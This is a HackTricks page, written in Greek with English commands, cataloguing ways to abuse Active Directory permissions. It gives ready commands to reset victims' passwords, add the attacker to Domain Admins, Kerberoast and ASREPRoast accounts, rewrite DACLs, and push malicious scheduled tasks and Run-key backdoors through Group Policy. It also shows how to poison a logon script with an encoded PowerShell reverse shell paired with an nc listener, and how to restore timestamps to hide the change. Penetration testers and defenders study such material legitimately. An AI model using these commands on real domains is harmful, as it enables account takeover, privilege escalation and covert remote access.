# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Αυτή η σελίδα είναι κυρίως μια περίληψη των τεχνικών από** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **και** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Για περισσότερες λεπτομέρειες, δείτε τα αρχικά άρθρα.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Δικαιώματα σε Χρήστη**

Αυτό το δικαίωμα παρέχει στον επιτιθέμενο πλήρη έλεγχο πάνω σε έναν λογαριασμό-στόχο χρήστη. Μόλις τα δικαιώματα `GenericAll` επιβεβαιωθούν χρησιμοποιώντας την εντολή `Get-ObjectAcl`, ο επιτιθέμενος μπορεί:

- **Αλλαγή του κωδικού του στόχου**: Χρησιμοποιώντας `net user <username> <password> /domain`, ο επιτιθέμενος μπορεί να επαναφέρει τον κωδικό του χρήστη.
- Από το Linux, μπορείτε να κάνετε το ίδιο μέσω SAMR με το Samba χρησιμοποιώντας `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Εάν ο λογαριασμός είναι απενεργοποιημένος, καταργήστε τη σημαία UAC**: `GenericAll` επιτρέπει την επεξεργασία του `userAccountControl`. Από το Linux, το BloodyAD μπορεί να αφαιρέσει τη σημαία `ACCOUNTDISABLE`:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Ανάθεσε ένα SPN στον λογαριασμό του χρήστη για να τον κάνεις kerberoastable, και στη συνέχεια χρησιμοποίησε Rubeus και targetedKerberoast.py για να εξάγεις και να προσπαθήσεις να crack τα ticket-granting ticket (TGT) hashes.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Στοχευμένο ASREPRoasting**: Απενεργοποιήστε την προ-επαλήθευση για τον χρήστη, κάνοντας τον λογαριασμό τους ευάλωτο σε ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Με το `GenericAll` σε έναν χρήστη μπορείτε να προσθέσετε ένα πιστοποιητικό-βασισμένο διαπιστευτήριο και να αυθεντικοποιηθείτε ως αυτός χωρίς να αλλάξετε τον κωδικό πρόσβασής τους. Δείτε:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Δικαιώματα `GenericAll` σε Ομάδα**

Αυτό το προνόμιο επιτρέπει σε έναν επιτιθέμενο να τροποποιήσει τα μέλη μιας ομάδας εάν έχει δικαιώματα `GenericAll` σε μια ομάδα όπως `Domain Admins`. Αφού εντοπίσει το διακριτό όνομα της ομάδας με `Get-NetGroup`, ο επιτιθέμενος μπορεί να:

- **Προσθήκη του εαυτού τους στην ομάδα `Domain Admins`**: Αυτό μπορεί να γίνει μέσω άμεσων εντολών ή χρησιμοποιώντας modules όπως Active Directory ή PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Από Linux μπορείς επίσης να χρησιμοποιήσεις το BloodyAD για να προσθέσεις τον εαυτό σου σε αυθαίρετες ομάδες όταν έχεις GenericAll/Write membership πάνω τους. Εάν η στοχευόμενη ομάδα είναι nested στο “Remote Management Users”, θα αποκτήσεις αμέσως WinRM access σε hosts που αναγνωρίζουν αυτή την ομάδα:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Η κατοχή αυτών των προνομίων σε ένα αντικείμενο υπολογιστή ή σε λογαριασμό χρήστη επιτρέπει:

- **Kerberos Resource-based Constrained Delegation**: Επιτρέπει την ανάληψη ελέγχου ενός αντικειμένου υπολογιστή.
- **Shadow Credentials**: Χρησιμοποιήστε αυτήν την τεχνική για να μιμηθείτε έναν υπολογιστή ή λογαριασμό χρήστη, εκμεταλλευόμενοι τα προνόμια για να δημιουργήσετε shadow credentials.

## **WriteProperty on Group**

Εάν ένας χρήστης έχει δικαιώματα `WriteProperty` σε όλα τα αντικείμενα για μία συγκεκριμένη ομάδα (π.χ. `Domain Admins`), μπορεί να:

- **Add Themselves to the Domain Admins Group**: Επιτυγχάνεται συνδυάζοντας τις εντολές `net user` και `Add-NetGroupUser`, αυτή η μέθοδος επιτρέπει privilege escalation εντός του domain.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Αυτό το προνόμιο επιτρέπει σε επιτιθέμενους να προσθέσουν οι ίδιοι τον εαυτό τους σε συγκεκριμένες ομάδες, όπως `Domain Admins`, μέσω εντολών που χειρίζονται άμεσα τη συμμετοχή σε ομάδες. Η χρήση της παρακάτω αλληλουχίας εντολών επιτρέπει την αυτοπροσθήκη:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Παρόμοιο προνόμιο, αυτό επιτρέπει σε επιτιθέμενους να προσθέσουν απευθείας τον εαυτό τους σε ομάδες τροποποιώντας τις ιδιότητες των ομάδων εάν έχουν το δικαίωμα `WriteProperty` σε αυτές τις ομάδες. Η επιβεβαίωση και η εκτέλεση αυτού του προνομίου γίνονται με:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Η κατοχή του `ExtendedRight` σε έναν χρήστη για το `User-Force-Change-Password` επιτρέπει επαναρυθμίσεις κωδικού χωρίς γνώση του τρέχοντος κωδικού. Η επαλήθευση αυτού του δικαιώματος και η εκμετάλλευσή του μπορούν να γίνουν μέσω PowerShell ή εναλλακτικών εργαλείων γραμμής εντολών, προσφέροντας αρκετές μεθόδους για την επαναφορά του κωδικού ενός χρήστη, συμπεριλαμβανομένων διαδραστικών συνεδριών και εντολών μίας γραμμής για μη διαδραστικά περιβάλλοντα. Οι εντολές κυμαίνονται από απλές κλήσεις PowerShell έως χρήση του `rpcclient` σε Linux, δείχνοντας την ευελιξία των διανυσμάτων επίθεσης.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner σε Group**

Εάν ένας επιτιθέμενος διαπιστώσει ότι έχει δικαιώματα `WriteOwner` σε μια ομάδα, μπορεί να αλλάξει την ιδιοκτησία της ομάδας προς τον εαυτό του. Αυτό είναι ιδιαίτερα σημαντικό όταν η ομάδα στην οποία αναφέρεται είναι οι `Domain Admins`, καθώς η αλλαγή ιδιοκτησίας επιτρέπει ευρύτερο έλεγχο στα attributes της ομάδας και στη σύνθεσή της. Η διαδικασία περιλαμβάνει την ταυτοποίηση του σωστού αντικειμένου μέσω του `Get-ObjectAcl` και στη συνέχεια τη χρήση του `Set-DomainObjectOwner` για να τροποποιηθεί ο ιδιοκτήτης, είτε με SID είτε με όνομα.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Αυτή η άδεια επιτρέπει σε έναν επιτιθέμενο να τροποποιεί ιδιότητες χρήστη. Συγκεκριμένα, με πρόσβαση `GenericWrite`, ο επιτιθέμενος μπορεί να αλλάξει τη διαδρομή του logon script ενός χρήστη ώστε να εκτελεστεί κακόβουλο script κατά τη σύνδεση του χρήστη. Αυτό επιτυγχάνεται χρησιμοποιώντας την εντολή `Set-ADObject` για την ενημέρωση της ιδιότητας `scriptpath` του στοχευόμενου χρήστη ώστε να δείχνει στο script του επιτιθέμενου.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Με αυτό το προνόμιο, οι επιτιθέμενοι μπορούν να χειριστούν τη συμμετοχή σε ομάδες, όπως να προσθέσουν τον εαυτό τους ή άλλους χρήστες σε συγκεκριμένες ομάδες. Αυτή η διαδικασία περιλαμβάνει τη δημιουργία ενός αντικειμένου διαπιστευτηρίων, τη χρήση του για να προσθέσουν ή να αφαιρέσουν χρήστες από μια ομάδα, και την επαλήθευση των αλλαγών στη συμμετοχή με εντολές PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Από το Linux, το Samba `net` μπορεί να προσθέσει/αφαιρέσει μέλη όταν έχεις `GenericWrite` στην ομάδα (χρήσιμο όταν το PowerShell/RSAT δεν είναι διαθέσιμα):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Η κατοχή ενός αντικειμένου AD και η ύπαρξη δικαιωμάτων `WriteDACL` σε αυτό επιτρέπει σε έναν επιτιθέμενο να χορηγήσει στον εαυτό του δικαιώματα `GenericAll` πάνω στο αντικείμενο. Αυτό επιτυγχάνεται μέσω χειρισμού του ADSI, επιτρέποντας πλήρη έλεγχο του αντικειμένου και τη δυνατότητα τροποποίησης των μελών των ομάδων του. Παρ' όλα αυτά, υπάρχουν περιορισμοί όταν προσπαθεί κανείς να εκμεταλλευτεί αυτά τα δικαιώματα χρησιμοποιώντας τα cmdlets `Set-Acl` / `Get-Acl` του Active Directory module.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner quick takeover (PowerView)

Όταν έχετε `WriteOwner` και `WriteDacl` πάνω σε λογαριασμό χρήστη ή λογαριασμό υπηρεσίας, μπορείτε να αποκτήσετε πλήρη έλεγχο και να επαναφέρετε τον κωδικό του χρησιμοποιώντας PowerView χωρίς να γνωρίζετε τον παλιό κωδικό:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Σημειώσεις:
- Ενδέχεται να χρειαστεί πρώτα να ορίσετε ως ιδιοκτήτη τον εαυτό σας αν έχετε μόνο `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Επαληθεύστε την πρόσβαση με οποιοδήποτε πρωτόκολλο (SMB/LDAP/RDP/WinRM) μετά την επαναφορά κωδικού.

## **Αναπαραγωγή στον Τομέα (DCSync)**

Η επίθεση DCSync εκμεταλλεύεται συγκεκριμένα δικαιώματα αναπαραγωγής στον τομέα για να μιμηθεί έναν Domain Controller και να συγχρονίσει δεδομένα, συμπεριλαμβανομένων διαπιστευτηρίων χρηστών. Αυτή η ισχυρή τεχνική απαιτεί δικαιώματα όπως `DS-Replication-Get-Changes`, επιτρέποντας σε επιτιθέμενους να εξάγουν ευαίσθητες πληροφορίες από το περιβάλλον AD χωρίς άμεση πρόσβαση σε Domain Controller. [**Μάθετε περισσότερα για την επίθεση DCSync εδώ.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### Ανάθεση GPO

Η εκχωρημένη πρόσβαση για διαχείριση Group Policy Objects (GPOs) μπορεί να αποτελεί σημαντικό κίνδυνο ασφάλειας. Για παράδειγμα, αν σε χρήστη όπως `offense\spotless` έχει εκχωρηθεί δικαίωμα διαχείρισης GPO, μπορεί να έχει προνόμια όπως **WriteProperty**, **WriteDacl**, και **WriteOwner**. Αυτά τα δικαιώματα μπορούν να καταχραστούν για κακόβουλους σκοπούς, όπως εντοπίζονται με χρήση PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Εντοπισμός Δικαιωμάτων GPO

Για να εντοπίσετε εσφαλμένα ρυθμισμένα GPOs, τα cmdlets του PowerSploit μπορούν να συνδυαστούν. Αυτό επιτρέπει την ανακάλυψη GPOs που ένας συγκεκριμένος χρήστης έχει δικαιώματα να διαχειρίζεται: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Υπολογιστές με την εν λόγω πολιτική**: Είναι δυνατό να εξακριβωθεί σε ποιους υπολογιστές εφαρμόζεται ένα συγκεκριμένο GPO, βοηθώντας να κατανοηθεί το εύρος του ενδεχόμενου αντίκτυπου. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Πολιτικές που εφαρμόζονται σε συγκεκριμένο υπολογιστή**: Για να δείτε ποιες πολιτικές εφαρμόζονται σε έναν συγκεκριμένο υπολογιστή, μπορούν να χρησιμοποιηθούν εντολές όπως `Get-DomainGPO`.

**OUs στα οποία εφαρμόζεται η πολιτική**: Ο εντοπισμός των organizational units (OUs) που επηρεάζονται από μια πολιτική μπορεί να γίνει με `Get-DomainOU`.

Μπορείτε επίσης να χρησιμοποιήσετε το εργαλείο [**GPOHound**](https://github.com/cogiceo/GPOHound) για την καταγραφή των GPOs και τον εντοπισμό προβλημάτων σε αυτά.

### Κατάχρηση GPO - New-GPOImmediateTask

Τα εσφαλμένα ρυθμισμένα GPOs μπορούν να εκμεταλλευτούν για την εκτέλεση κώδικα, για παράδειγμα δημιουργώντας ένα άμεσο προγραμματισμένο task. Αυτό μπορεί να χρησιμοποιηθεί για να προστεθεί ένας χρήστης στην ομάδα τοπικών διαχειριστών στα επηρεαζόμενα μηχανήματα, αυξάνοντας σημαντικά τα προνόμια:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Το GroupPolicy module, αν είναι εγκατεστημένο, επιτρέπει τη δημιουργία και τη σύνδεση νέων GPOs, καθώς και τον ορισμό προτιμήσεων όπως registry values για την εκτέλεση backdoors στους επηρεαζόμενους υπολογιστές. Αυτή η μέθοδος απαιτεί το GPO να ενημερωθεί και ένας χρήστης να συνδεθεί στον υπολογιστή για να γίνει η εκτέλεση:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

Το SharpGPOAbuse προσφέρει μια μέθοδο για την εκμετάλλευση υπαρχόντων GPOs προσθέτοντας εργασίες ή τροποποιώντας ρυθμίσεις χωρίς την ανάγκη δημιουργίας νέων GPOs. Αυτό το εργαλείο απαιτεί τροποποίηση των υπαρχόντων GPOs ή χρήση των RSAT εργαλείων για τη δημιουργία νέων πριν την εφαρμογή των αλλαγών:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Αναγκαστική Ενημέρωση Πολιτικής

Οι ενημερώσεις GPO συμβαίνουν συνήθως περίπου κάθε 90 λεπτά. Για να επιταχυνθεί αυτή η διαδικασία, ειδικά μετά την εφαρμογή μιας αλλαγής, η εντολή `gpupdate /force` μπορεί να χρησιμοποιηθεί στον υπολογιστή-στόχο για να επιβάλει άμεσα την ενημέρωση πολιτικής. Η εντολή αυτή εξασφαλίζει ότι οποιεσδήποτε τροποποιήσεις στα GPO εφαρμόζονται χωρίς να περιμένουν τον επόμενο αυτόματο κύκλο ενημέρωσης.

### Εσωτερικά

Με την εξέταση των προγραμματισμένων εργασιών (Scheduled Tasks) για ένα δεδομένο GPO, όπως το `Misconfigured Policy`, μπορεί να επιβεβαιωθεί η προσθήκη εργασιών όπως το `evilTask`. Αυτές οι εργασίες δημιουργούνται μέσω scripts ή εργαλείων γραμμής εντολών με στόχο τη μεταβολή της συμπεριφοράς του συστήματος ή την escalation προνομίων.

Η δομή της εργασίας, όπως εμφανίζεται στο αρχείο διαμόρφωσης XML που παράγεται από την εντολή `New-GPOImmediateTask`, περιγράφει τις ειδικές λεπτομέρειες της προγραμματισμένης εργασίας — συμπεριλαμβανομένης της εντολής που θα εκτελεστεί και των ενεργοποιητών της. Αυτό το αρχείο αναπαριστά τον τρόπο με τον οποίο οι προγραμματισμένες εργασίες ορίζονται και διαχειρίζονται μέσα σε GPO, παρέχοντας μέθοδο για την εκτέλεση αυθαίρετων εντολών ή scripts ως μέρος της επιβολής πολιτικών.

### Χρήστες και Ομάδες

Τα GPO επιτρέπουν επίσης την τροποποίηση μελών χρηστών και ομάδων στα συστήματα-στόχους. Επεξεργαζόμενοι απευθείας τα policy αρχεία Users and Groups, οι επιτιθέμενοι μπορούν να προσθέσουν χρήστες σε προνομιούχες ομάδες, όπως την τοπική ομάδα `administrators`. Αυτό είναι εφικτό μέσω της ανάθεσης δικαιωμάτων διαχείρισης GPO, που επιτρέπει την τροποποίηση των αρχείων πολιτικής για την προσθήκη νέων χρηστών ή την αλλαγή των μελών ομάδων.

Το αρχείο διαμόρφωσης XML για τους Users and Groups περιγράφει πώς εφαρμόζονται αυτές οι αλλαγές. Με την προσθήκη εγγραφών σε αυτό το αρχείο, συγκεκριμένοι χρήστες μπορούν να λάβουν υψηλότερα προνόμια σε όλα τα επηρεαζόμενα συστήματα. Αυτή η μέθοδος προσφέρει μια άμεση προσέγγιση για privilege escalation μέσω χειρισμού των GPO.

Επιπλέον, μπορούν να εξεταστούν και άλλες μέθοδοι για την εκτέλεση κώδικα ή τη διατήρηση persistence, όπως η αξιοποίηση logon/logoff scripts, η τροποποίηση registry keys για autoruns, η εγκατάσταση λογισμικού μέσω .msi αρχείων, ή η επεξεργασία ρυθμίσεων υπηρεσιών. Αυτές οι τεχνικές παρέχουν διάφορες οδούς για τη διατήρηση πρόσβασης και τον έλεγχο των συστημάτων-στόχων μέσω κατάχρησης των GPO.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.

### Εντοπισμός logon scripts
- Ελέγξτε τα attributes του χρήστη για ρυθμισμένο logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Σαρώστε τους κοινόχρηστους φακέλους του domain για να αποκαλύψετε shortcuts ή αναφορές σε scripts:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Ανάλυση των αρχείων `.lnk` για να εντοπιστούν στόχοι που δείχνουν στο SYSVOL/NETLOGON (χρήσιμο κόλπο για DFIR και για επιτιθέμενους χωρίς άμεση πρόσβαση σε GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- Το BloodHound εμφανίζει το `logonScript` (scriptPath) attribute στους κόμβους χρηστών όταν υπάρχει.

### Επικυρώστε την πρόσβαση εγγραφής (μην εμπιστεύεστε τις καταχωρίσεις share)
Αυτοματοποιημένα εργαλεία μπορεί να εμφανίσουν το SYSVOL/NETLOGON ως read-only, αλλά οι υποκείμενες NTFS ACLs μπορεί να επιτρέψουν εγγραφές. Πάντα δοκιμάζετε:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
If το μέγεθος αρχείου ή το mtime αλλάξει, έχετε δικαίωμα εγγραφής. Διατηρήστε τα πρωτότυπα πριν τα τροποποιήσετε.

### Poison a VBScript logon script for RCE
Προσθέστε στο τέλος μια εντολή που εκκινεί ένα PowerShell reverse shell (generate from revshells.com) και διατηρήστε την αρχική λογική για να αποφύγετε τη διακοπή της επιχειρησιακής λειτουργίας:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Ακούστε στον υπολογιστή σας και περιμένετε την επόμενη διαδραστική σύνδεση:
```bash
rlwrap -cAr nc -lnvp 443
```
Σημειώσεις:
- Η εκτέλεση γίνεται υπό το token του συνδεδεμένου χρήστη (όχι SYSTEM). Η εμβέλεια είναι ο GPO σύνδεσμος (OU, site, domain) που εφαρμόζει αυτό το script.
- Καθαρίστε αποκαθιστώντας το αρχικό περιεχόμενο/χρονοσφραγίδες μετά τη χρήση.


## Αναφορές

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

{{#include ../../../banners/hacktricks-training.md}}
